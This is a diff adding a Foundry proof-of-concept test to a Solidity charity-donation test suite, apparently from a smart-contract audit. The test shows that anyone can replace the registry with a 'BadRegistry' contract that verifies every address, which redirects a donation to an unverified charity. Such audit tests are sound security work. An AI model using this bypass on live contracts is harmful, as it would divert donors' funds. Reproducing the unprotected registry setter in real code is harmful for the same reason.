@@ -125,4 +125,21 @@ contract GivingThanksTest is Test {
         vm.prank(donor);
         charityContract.donate{ value: 1 ether }(charity);
     }
+
+    function testAnyoneCanUpdateRegistry() public {
+        address badCharity = makeAddr("badCharity");
+        BadRegistry badRegistry = new BadRegistry();
+        charityContract.updateRegistry(address(badRegistry));
+        registryContract.registerCharity(badCharity);
+        vm.deal(donor, 10 ether);
+        vm.prank(donor);
+        charityContract.donate{ value: 1 ether }(badCharity);
+        assertEq(badCharity.balance, 1 ether);
+    }
+}
+
+contract BadRegistry {
+    function isVerified(address) public pure returns (bool) {
+        return true;
+    }
 }
